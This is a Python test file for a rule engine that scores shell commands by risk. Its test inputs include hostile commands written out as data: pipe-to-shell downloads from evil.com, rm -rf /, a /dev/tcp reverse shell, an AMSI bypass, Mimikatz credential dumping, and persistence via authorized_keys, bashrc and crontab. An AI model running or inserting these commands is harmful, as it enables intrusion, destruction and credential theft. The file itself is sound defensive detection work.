from pathlib import Path

import pytest

from sentinelai.core.models import CommandContext, RiskLevel
from sentinelai.core import rule_engine


def ctx(command: str, shell: str = "bash") -> CommandContext:
    return CommandContext(command=command, shell=shell, source="clipboard")


def top_severity(command: str, shell: str = "bash") -> RiskLevel | None:
    matches = rule_engine.evaluate(ctx(command, shell))
    return matches[0].severity if matches else None


# ---------------------------------------------------------------------------
# True positives — these MUST fire
# ---------------------------------------------------------------------------

class TestRemoteExecution:
    def test_curl_pipe_bash(self):
        matches = rule_engine.evaluate(ctx("curl https://example.com/setup.sh | bash"))
        assert matches, "curl | bash should fire"
        assert matches[0].severity == RiskLevel.CRITICAL

    def test_wget_pipe_sh(self):
        matches = rule_engine.evaluate(ctx("wget -O - https://evil.com/x.sh | sh"))
        assert matches
        assert matches[0].severity == RiskLevel.CRITICAL

    def test_irm_pipe_iex(self):
        cmd = "irm https://example.com/install.ps1 | iex"
        matches = rule_engine.evaluate(ctx(cmd, shell="powershell"))
        assert matches
        assert matches[0].severity == RiskLevel.CRITICAL


class TestDestructive:
    def test_rm_rf_home(self):
        matches = rule_engine.evaluate(ctx("rm -rf ~/"))
        assert matches
        assert matches[0].severity == RiskLevel.CRITICAL

    def test_rm_rf_slash(self):
        matches = rule_engine.evaluate(ctx("rm -rf /"))
        assert matches
        assert matches[0].severity == RiskLevel.CRITICAL


class TestReverseShell:
    def test_bash_tcp_reverse_shell(self):
        matches = rule_engine.evaluate(ctx("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))
        assert matches
        assert matches[0].severity == RiskLevel.CRITICAL


class TestPowerShell:
    def test_encoded_command(self):
        cmd = "powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0"
        matches = rule_engine.evaluate(ctx(cmd, shell="powershell"))
        assert matches
        assert matches[0].severity == RiskLevel.CRITICAL

    def test_iex_download(self):
        cmd = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')"
        matches = rule_engine.evaluate(ctx(cmd, shell="powershell"))
        assert matches
        assert matches[0].severity == RiskLevel.CRITICAL

    def test_amsi_bypass(self):
        cmd = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        matches = rule_engine.evaluate(ctx(cmd, shell="powershell"))
        assert matches
        assert matches[0].severity == RiskLevel.CRITICAL

    def test_execution_policy_bypass(self):
        cmd = "powershell -ExecutionPolicy Bypass -File evil.ps1"
        matches = rule_engine.evaluate(ctx(cmd, shell="powershell"))
        assert matches
        assert matches[0].severity >= RiskLevel.HIGH

    def test_mimikatz(self):
        cmd = "Invoke-Mimikatz -DumpCreds"
        matches = rule_engine.evaluate(ctx(cmd, shell="powershell"))
        assert matches
        assert matches[0].severity == RiskLevel.CRITICAL


class TestPersistence:
    def test_ssh_key_injection(self):
        cmd = 'echo "ssh-rsa AAAA... attacker@evil.com" >> ~/.ssh/authorized_keys'
        matches = rule_engine.evaluate(ctx(cmd))
        assert matches
        assert matches[0].severity == RiskLevel.CRITICAL

    def test_bashrc_modification(self):
        cmd = 'echo "curl http://c2.com/beacon | bash" >> ~/.bashrc'
        matches = rule_engine.evaluate(ctx(cmd))
        assert matches
        assert matches[0].severity >= RiskLevel.HIGH

    def test_crontab_modification(self):
        cmd = '(crontab -l; echo "@reboot curl http://evil.com/c2.sh | bash") | crontab -'
        matches = rule_engine.evaluate(ctx(cmd))
        assert matches
        assert matches[0].severity >= RiskLevel.HIGH


class TestObfuscation:
    def test_char_concat(self):
        cmd = "$cmd = [char]115+[char]104+[char]32; IEX $cmd"
        matches = rule_engine.evaluate(ctx(cmd, shell="powershell"))
        assert matches

    def test_base64_blob(self):
        blob = "A" * 100 + "=="
        cmd = f"echo {blob} | base64 -d | bash"
        matches = rule_engine.evaluate(ctx(cmd))
        assert matches


# ---------------------------------------------------------------------------
# True negatives — these must NOT fire
# ---------------------------------------------------------------------------

BENIGN_FIXTURE = Path(__file__).parent.parent / "fixtures" / "benign_commands.txt"


def _load_benign() -> list[str]:
    lines = BENIGN_FIXTURE.read_text().splitlines()
    return [l for l in lines if l.strip() and not l.startswith("#")]


@pytest.mark.parametrize("command", _load_benign())
def test_benign_commands_do_not_fire(command: str):
    matches = rule_engine.evaluate(ctx(command))
    # Allow low-severity matches on benign commands (e.g. curl without pipe)
    # but nothing HIGH or above.
    critical_or_high = [m for m in matches if m.severity >= RiskLevel.HIGH]
    assert not critical_or_high, (
        f"False positive on benign command: {command!r}\n"
        f"Fired rules: {[m.rule_id for m in critical_or_high]}"
    )


# ---------------------------------------------------------------------------
# Structural / meta tests
# ---------------------------------------------------------------------------

def test_rules_loaded():
    rule_engine.reload_rules()
    # At minimum we expect rules from all four YAML files.
    cmd = "curl http://evil.com/x.sh | bash"
    matches = rule_engine.evaluate(ctx(cmd))
    assert len(matches) >= 1


def test_matches_sorted_by_severity_descending():
    # This command should match multiple rules; verify ordering.
    cmd = 'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys && curl http://ip/x | bash'
    matches = rule_engine.evaluate(ctx(cmd))
    if len(matches) > 1:
        for i in range(len(matches) - 1):
            assert matches[i].severity >= matches[i + 1].severity


def test_match_includes_pattern_that_fired():
    matches = rule_engine.evaluate(ctx("rm -rf /"))
    assert matches
    assert matches[0].matched_patterns, "matched_patterns should be populated"


def test_explanation_not_empty():
    matches = rule_engine.evaluate(ctx("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))
    assert matches
    assert matches[0].explanation.strip()
